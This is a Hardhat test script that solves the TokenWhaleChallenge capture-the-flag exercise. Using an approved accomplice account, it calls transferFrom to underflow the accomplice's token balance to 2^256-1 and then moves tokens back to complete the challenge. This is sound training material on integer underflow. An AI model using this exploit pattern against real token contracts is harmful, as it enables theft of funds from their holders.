import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
// import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let contractAsEOA: Contract;
let contractAsAccomplice: Contract;
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, accomplice] = accounts.slice(0, 2);
  const contractFactory = await ethers.getContractFactory(
    "TokenWhaleChallenge"
  );
  contractAsEOA = contractFactory.attach(
    `0x1BEdE93A83bf7bb914721eA8cE26adBE4499d6fc`
  );
  contractAsAccomplice = contractAsEOA.connect(accomplice);

  // accomplice has to have some balance in order to make transactions
  if ((await accomplice.getBalance()).lt(ethers.utils.parseEther(`0.1`))) {
    tx = await eoa.sendTransaction({
      to: await accomplice.getAddress(),
      value: ethers.utils.parseEther(`0.1`),
    });
    console.log(`tx.hash`, tx.hash)
    await tx.wait();
  }
  // check if the balance is tranferred 
  console.log(`accomplice address`, await accomplice.getAddress())
  console.log(`accomplice balance`, await accomplice.getBalance());
});

it("solves the challenge", async function () {
  const eoaAddress = await eoa.getAddress();
  const accompliceAddress = await accomplice.getAddress();

  console.log(`Checking eoaAddress balance ... ${eoaAddress}`);
  expect(await contractAsEOA.balanceOf(eoaAddress)).to.be.equals(
    BigNumber.from(`1000`)
  );

  console.log(`Approving accomplice ...`);
  tx = await contractAsEOA.approve(accompliceAddress, BigNumber.from(`2`).pow(`255`));
  console.log(`tx.hash`, tx.hash)
  await tx.wait()

  console.log(`Making transaction "transferFrom(from eoa, to eoa, 1 token)" from accomplice`);
  // when balanceOf[msg.sender] -= value; is executed, balanceOf[msg.sender] is underflowed, turning to 2^256-1 
  tx = await contractAsAccomplice.transferFrom(eoaAddress, eoaAddress, `1`);
  console.log(`tx.hash`, tx.hash)
  await tx.wait();

  // accomplice has 2^256-1 tokens now
  console.log(`Checking accomplice balance ...`);
  expect(await contractAsAccomplice.balanceOf(accompliceAddress)).to.be.equals(
    BigNumber.from(`2`).pow(`256`).sub(`1`)
  );

  console.log(`Transfering funds to eoa ...`);
  tx = await contractAsAccomplice.transfer(eoaAddress, `1000000`);
  console.log(`tx.hash`, tx.hash)
  await tx.wait();

  const isComplete = await contractAsEOA.isComplete();
  expect(isComplete).to.be.true;
});
